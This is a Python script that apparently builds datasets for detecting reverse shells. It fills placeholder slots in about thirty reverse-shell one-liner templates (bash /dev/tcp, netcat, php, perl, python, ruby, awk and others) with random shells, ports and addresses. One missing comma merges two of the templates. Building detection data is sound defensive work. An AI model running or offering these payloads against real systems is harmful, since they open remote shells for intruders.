import re
import random
import string
from typing import List, Dict, Optional
from tqdm import tqdm


REVERSE_SHELL_TEMPLATES = [
        r"NIX_SHELL -i >& /dev/PROTOCOL_TYPE/IP_ADDRESS/PORT_NUMBER 0>&1",
        r"0<&FD_NUMBER;exec FD_NUMBER<>/dev/PROTOCOL_TYPE/IP_ADDRESS/PORT_NUMBER; NIX_SHELL <&FD_NUMBER >&FD_NUMBER 2>&FD_NUMBER",
        #r"exec FD_NUMBER<>/dev/PROTOCOL_TYPE/IP_ADDRESS/PORT_NUMBER;cat <&FD_NUMBER | while read VARIABLE_NAME; do $VARIABLE_NAME 2>&FD_NUMBER >&FD_NUMBER; done",
        r"NIX_SHELL -i FD_NUMBER<> /dev/PROTOCOL_TYPE/IP_ADDRESS/PORT_NUMBER 0<&FD_NUMBER 1>&FD_NUMBER 2>&FD_NUMBER",
        r"rm FILE_PATH;mkfifo FILE_PATH;cat FILE_PATH|NIX_SHELL -i 2>&1|nc IP_ADDRESS PORT_NUMBER >FILE_PATH",
        r"rm FILE_PATH;mkfifo FILE_PATH;cat FILE_PATH|NIX_SHELL -i 2>&1|nc -u IP_ADDRESS PORT_NUMBER >FILE_PATH",
        r"nc -e NIX_SHELL IP_ADDRESS PORT_NUMBER",
        r"nc -eu NIX_SHELL IP_ADDRESS PORT_NUMBER",
        r"nc -c NIX_SHELL IP_ADDRESS PORT_NUMBER",
        r"nc -cu NIX_SHELL IP_ADDRESS PORT_NUMBER",
        r"rcat IP_ADDRESS PORT_NUMBER -r NIX_SHELL",
        r"""perl -e 'use Socket;$VARIABLE_NAME_1="IP_ADDRESS";$VARIABLE_NAME_2=PORT_NUMBER;socket(S,PF_INET,SOCK_STREAM,getprotobyname("PROTOCOL_TYPE"));if(connect(S,sockaddr_in($VARIABLE_NAME_1,inet_aton($VARIABLE_NAME_2)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("NIX_SHELL -i");};'""",
        #r"""perl -MIO -e '$VARIABLE_NAME_1=fork;exit,if($VARIABLE_NAME_1);$VARIABLE_NAME_2=new IO::Socket::INET(PeerAddr,"IP_ADDRESS:PORT_NUMBER");STDIN->fdopen($VARIABLE_NAME_2,r);$~->fdopen($VARIABLE_NAME_2,w);system$_ while<>;'""",
        r"""php -r '$VARIABLE_NAME=fsockopen("IP_ADDRESS",PORT_NUMBER);shell_exec("NIX_SHELL <&FD_NUMBER >&FD_NUMBER 2>&FD_NUMBER");'""",
        r"""php -r '$VARIABLE_NAME=fsockopen("IP_ADDRESS",PORT_NUMBER);exec("NIX_SHELL <&FD_NUMBER >&FD_NUMBER 2>&FD_NUMBER");'""",
        r"""php -r '$VARIABLE_NAME=fsockopen("IP_ADDRESS",PORT_NUMBER);system("NIX_SHELL <&FD_NUMBER >&FD_NUMBER 2>&FD_NUMBER");'""",
        r"""php -r '$VARIABLE_NAME=fsockopen("IP_ADDRESS",PORT_NUMBER);passthru("NIX_SHELL <&FD_NUMBER >&FD_NUMBER 2>&FD_NUMBER");'""",
        r"""php -r '$VARIABLE_NAME=fsockopen("IP_ADDRESS",PORT_NUMBER);popen("NIX_SHELL <&FD_NUMBER >&FD_NUMBER 2>&FD_NUMBER", "r");'""",
        r"""php -r '$VARIABLE_NAME=fsockopen("IP_ADDRESS",PORT_NUMBER);`NIX_SHELL <&FD_NUMBER >&FD_NUMBER 2>&FD_NUMBER`;'""",
        r"""php -r '$VARIABLE_NAME_1=fsockopen("IP_ADDRESS",PORT_NUMBER);$VARIABLE_NAME_2=proc_open("NIX_SHELL", array(0=>$VARIABLE_NAME_1, 1=>$VARIABLE_NAME_1, 2=>$VARIABLE_NAME_1),$VARIABLE_NAME_2);'""",
        r"""export VARIABLE_NAME_1="IP_ADDRESS";export VARIABLE_NAME_2=PORT_NUMBER;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("VARIABLE_NAME_1"),int(os.getenv("VARIABLE_NAME_2"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("NIX_SHELL")'""",
        r"""export VARIABLE_NAME_1="IP_ADDRESS";export VARIABLE_NAME_2=PORT_NUMBER;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("VARIABLE_NAME_1"),int(os.getenv("VARIABLE_NAME_2"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("NIX_SHELL")'"""
        r"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP_ADDRESS",PORT_NUMBER));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("NIX_SHELL")'""",
        r"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP_ADDRESS",PORT_NUMBER));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("NIX_SHELL")'""",
        r"""python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("IP_ADDRESS",PORT_NUMBER));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("NIX_SHELL")'""",
        r"""ruby -rsocket -e'spawn("NIX_SHELL",[:in,:out,:err]=>TCPSocket.new("IP_ADDRESS",PORT_NUMBER))'""",
        r"""ruby -rsocket -e'spawn("NIX_SHELL",[:in,:out,:err]=>TCPSocket.new("IP_ADDRESS","PORT_NUMBER"))'""",
        r"""ruby -rsocket -e'exit if fork;c=TCPSocket.new("IP_ADDRESS",PORT_NUMBER);loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'""",
        r"""ruby -rsocket -e'exit if fork;c=TCPSocket.new("IP_ADDRESS","PORT_NUMBER");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'""",
        #r"""socat PROTOCOL_TYPE:IP_ADDRESS:PORT_NUMBER EXEC:NIX_SHELL"""
        #r"""socat PROTOCOL_TYPE:IP_ADDRESS:PORT_NUMBER EXEC:'NIX_SHELL',pty,stderr,setsid,sigint,sane""",
        r"""VARIABLE_NAME=$(mktemp -u);mkfifo $VARIABLE_NAME && telnet IP_ADDRESS PORT_NUMBER 0<$VARIABLE_NAME | NIX_SHELL 1>$VARIABLE_NAME""",
        #r"""zsh -c 'zmodload zsh/net/tcp && ztcp IP_ADDRESS PORT_NUMBER && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'""",
        r"""lua -e "require('socket');require('os');t=socket.PROTOCOL_TYPE();t:connect('IP_ADDRESS','PORT_NUMBER');os.execute('NIX_SHELL -i <&FD_NUMBER >&FD_NUMBER 2>&FD_NUMBER');""",
        #r"""lua5.1 -e 'local VARIABLE_NAME_1, VARIABLE_NAME_2 = "IP_ADDRESS", PORT_NUMBER local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(VARIABLE_NAME_1, VARIABLE_NAME_2); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'""",
        r"""echo 'import os' > FILE_PATH.v && echo 'fn main() { os.system("nc -e NIX_SHELL IP_ADDRESS PORT_NUMBER 0>&1") }' >> FILE_PATH.v && v run FILE_PATH.v && rm FILE_PATH.v""",
        r"""awk 'BEGIN {VARIABLE_NAME_1 = "/inet/PROTOCOL_TYPE/0/IP_ADDRESS/PORT_NUMBER"; while(FD_NUMBER) { do{ printf "shell>" |& VARIABLE_NAME_1; VARIABLE_NAME_1 |& getline VARIABLE_NAME_2; if(VARIABLE_NAME_2){ while ((VARIABLE_NAME_2 |& getline) > 0) print $0 |& VARIABLE_NAME_1; close(VARIABLE_NAME_2); } } while(VARIABLE_NAME_2 != "exit") close(VARIABLE_NAME_1); }}' /dev/null"""
    ]

NIX_SHELLS = ["sh", "bash", "dash"] #"tcsh", "zsh", "ksh", "pdksh", "ash", "bsh", "csh"]
NIX_SHELL_FOLDERS = ["/bin/", "/usr/bin/"] #, "/usr/local/bin/"]

class NixCommandAugmentation:
    def __init__(
            self,
            templates: List[str] = REVERSE_SHELL_TEMPLATES,
            nix_shells: List[str] = ["sh", "bash", "dash"],
            nix_shell_folders: List[str] = ["/bin/", "/usr/bin/"],
            nr_of_random_values: int = 5,
            random_state: int = 42
    ):
        self.templates = templates
        self.shell_list = []
        for shell in nix_shells:
            shell_fullpaths = [x+shell for x in nix_shell_folders]
            self.shell_list.extend(shell_fullpaths + [shell])
        random.seed(random_state)
        
        # TODO: make this more generic
        self.placeholder_sampling_functions = {
            'NIX_SHELL': lambda: random.choice(self.shell_list),
            'PROTOCOL_TYPE': lambda: random.choice(["tcp", "udp"]),
            'FD_NUMBER': lambda: 3,
            'FILE_PATH': lambda: random.choice(["/tmp/f", "/tmp/t"] + self.get_random_filepaths(count=nr_of_random_values)),
            'VARIABLE_NAME': lambda: random.choice(["port", "host", "cmd", "p", "s", "c", ] + [self.get_random_string(length=4) for _ in range(nr_of_random_values)]),
            'IP_ADDRESS': lambda: random.choice(["127.0.0.1"] + ["10."+self.get_random_ip(octets=3) for _ in range(nr_of_random_values)]),
            'PORT_NUMBER': lambda: random.choice([8080, 9001, 80, 443, 53, 22, 8000, 8888] + [int(random.uniform(0,65535)) for _ in range(nr_of_random_values)]),
        }

    @staticmethod
    def get_random_ip(octets: int = 4):
        return ".".join(map(str, (random.randint(0, 255) for _ in range(octets))))

    @staticmethod
    def get_random_string(length: int = 10):
        return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(length))

    def get_random_filepaths(
        self,
        count: int = 1, 
        path_roots : str = ["/tmp/", "/home/user/", "/var/www/"]
    ) -> List[str]:
        folder_lenths = [1, 8]
        random_paths = []
        for _ in range(count):
            random_paths.append(random.choice(path_roots) + self.get_random_string(random.choice(folder_lenths)))
        return random_paths


    def generate_commands(
            self,
            number_of_examples_per_template: int,
            # baseline: List[str] = None # adversarial
        ) -> List[str]:
        """
        Generates a dataset of commands based on the given templates and placeholder sampling functions.
        :param number_of_examples_per_template: number of examples to generate per template
        :param baseline: list of baseline commands to prepend to the generated commands
        :return: list of generated commands
        """
        DATASET = []

        print(f"[!] Generating {number_of_examples_per_template} number of examples per template." )
        for cmd in tqdm(self.templates):
            for _ in range(number_of_examples_per_template):
                new_cmd = cmd
                for placeholder, sampling_func in self.placeholder_sampling_functions.items():
                    if placeholder in new_cmd:
                        new_cmd = new_cmd.replace(placeholder, str(sampling_func()))
                # if baseline is not None:
                #     # sample randomly 3-5 baselines and append them to the new command
                #     baseline_samples = random.sample(baseline, random.randint(3, 5))
                #     new_cmd = ";".join(baseline_samples) + ";" + new_cmd
                DATASET.append(new_cmd)

        print(f"[!] Generated total {len(DATASET)} commands.")
        return DATASET


class NixCommandAugmentationWithBaseline:
    def __init__(
            self,
            templates: List[str] = None,
            nix_shells: List[str] = ["sh", "bash", "dash"],
            nix_shell_folders: List[str] = ["/bin/", "/usr/bin/"],
            random_state: int = 42,
            legitimate_baseline: Optional[List[str]] = None
    ):
        self.templates = templates
        self.shell_list = []
        for shell in nix_shells:
            shell_fullpaths = [x+shell for x in nix_shell_folders]
            self.shell_list.extend(shell_fullpaths + [shell])
        random.seed(random_state)
        
        # Extract patterns from baseline if provided
        self.baseline_patterns = self._analyze_baseline(legitimate_baseline) if legitimate_baseline else {}
        
        # Enhanced placeholder sampling functions incorporating baseline patterns
        self.placeholder_sampling_functions = {
            'NIX_SHELL': self._create_shell_sampler(),
            'PROTOCOL_TYPE': self._create_protocol_sampler(),
            'FD_NUMBER': lambda: self._sample_with_baseline_bias('FD_NUMBER', lambda: 3),
            'FILE_PATH': self._create_filepath_sampler(),
            'VARIABLE_NAME': self._create_variable_sampler(),
            'IP_ADDRESS': self._create_ip_sampler(),
            'PORT_NUMBER': self._create_port_sampler()
        }

    def _analyze_baseline(self, baseline_commands: List[str]) -> Dict:
        """Analyzes baseline commands to extract relevant patterns."""
        patterns = {
            'FILE_PATH': set(),
            'VARIABLE_NAME': set(),
            'PORT_NUMBER': set(),
            'IP_ADDRESS': set(),
            'FD_NUMBER': set()
        }
        
        # Extract patterns from baseline commands
        for cmd in baseline_commands:
            # File paths
            paths = re.findall(r'(?:^|\s)(/[\w/.-]+)', cmd)
            patterns['FILE_PATH'].update(paths)
            
            # Variable names
            vars = re.findall(r'\$(\w+)', cmd)
            patterns['VARIABLE_NAME'].update(vars)
            
            # Port numbers
            ports = re.findall(r':(\d{2,5})', cmd)
            patterns['PORT_NUMBER'].update(map(int, ports))
            
            # IP addresses
            ips = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', cmd)
            patterns['IP_ADDRESS'].update(ips)

        return patterns

    def _sample_with_baseline_bias(self, pattern_type: str, fallback_sampler: callable, 
                                 baseline_probability: float = 0.7) -> any:
        """Samples values with a bias towards baseline patterns when available."""
        if pattern_type in self.baseline_patterns and self.baseline_patterns[pattern_type]:
            if random.random() < baseline_probability:
                return random.choice(list(self.baseline_patterns[pattern_type]))
        return fallback_sampler()

    def _create_shell_sampler(self):
        return lambda: random.choice(self.shell_list)

    def _create_protocol_sampler(self):
        return lambda: random.choice(["tcp", "udp"])

    def _create_filepath_sampler(self):
        def sampler():
            default_paths = ["/tmp/f", "/tmp/t"] + self.get_random_filepaths(count=5)
            return self._sample_with_baseline_bias(
                'FILE_PATH',
                lambda: random.choice(default_paths)
            )
        return sampler

    def _create_variable_sampler(self):
        def sampler():
            default_vars = ["port", "host", "cmd", "p", "s", "c"] + \
                         [self.get_random_string(length=4) for _ in range(5)]
            return self._sample_with_baseline_bias(
                'VARIABLE_NAME',
                lambda: random.choice(default_vars)
            )
        return sampler

    def _create_ip_sampler(self):
        def sampler():
            default_ips = ["127.0.0.1"] + ["10."+self.get_random_ip(octets=3) for _ in range(5)]
            return self._sample_with_baseline_bias(
                'IP_ADDRESS',
                lambda: random.choice(default_ips)
            )
        return sampler

    def _create_port_sampler(self):
        def sampler():
            default_ports = [8080, 9001, 80, 443, 53, 22, 8000, 8888] + \
                          [int(random.uniform(0,65535)) for _ in range(5)]
            return self._sample_with_baseline_bias(
                'PORT_NUMBER',
                lambda: random.choice(default_ports)
            )
        return sampler

    @staticmethod
    def get_random_ip(octets: int = 4) -> str:
        return ".".join(map(str, (random.randint(0, 255) for _ in range(octets))))

    @staticmethod
    def get_random_string(length: int = 10) -> str:
        return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(length))

    def get_random_filepaths(self, count: int = 1, 
                           path_roots: List[str] = ["/tmp/", "/home/user/", "/var/www/"]) -> List[str]:
        folder_lengths = [1, 8]
        random_paths = []
        for _ in range(count):
            random_paths.append(random.choice(path_roots) + 
                              self.get_random_string(random.choice(folder_lengths)))
        return random_paths

    def generate_commands(self, number_of_examples_per_template: int) -> List[str]:
        """Generates a dataset of commands based on templates and sampling functions."""
        dataset = []
        
        print(f"[!] Generating {number_of_examples_per_template} examples per template.")
        for cmd in self.templates:
            for _ in range(number_of_examples_per_template):
                new_cmd = cmd
                for placeholder, sampling_func in self.placeholder_sampling_functions.items():
                    if placeholder in new_cmd:
                        new_cmd = new_cmd.replace(placeholder, str(sampling_func()))
                dataset.append(new_cmd)

        print(f"[!] Generated total {len(dataset)} commands.")
        return dataset